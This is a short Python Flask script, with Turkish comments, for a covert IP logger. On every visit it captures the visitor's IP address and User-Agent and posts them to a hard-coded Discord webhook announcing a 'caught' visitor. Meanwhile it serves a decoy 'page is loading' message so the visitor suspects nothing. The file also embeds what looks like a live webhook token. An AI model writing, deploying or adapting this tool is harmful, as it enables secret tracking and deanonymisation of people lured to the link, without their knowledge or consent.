from flask import Flask, request
import requests
import os

app = Flask(__name__)

# Discord Webhook URL'ni buraya yapıştır
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1565829327067684985/o10w6-xbGWqXFeAe20JDhxyoUBr74JcdsswTmLNxKKj22G5vJIF2Y9LRs-LDiujHz2PQ"

@app.route('/')
def ip_logger():
    if request.headers.get('X-Forwarded-For'):
        ip_address = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        ip_address = request.remote_addr

    user_agent = request.headers.get('User-Agent')

    # Discord'a gönderilecek mesaj
    discord_data = {
        "content": f"🚨 **Yeni Ziyaretçi Yakalandı (Render)!**\n> 🌐 **IP:** `{ip_address}`\n> 💻 **Cihaz:** `{user_agent}`"
    }

    try:
        requests.post(DISCORD_WEBHOOK_URL, json=discord_data)
    except Exception as e:
        print(e)

    return "<h1>Hoş Geldiniz</h1><p>Aradığınız sayfa yükleniyor...</p>"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
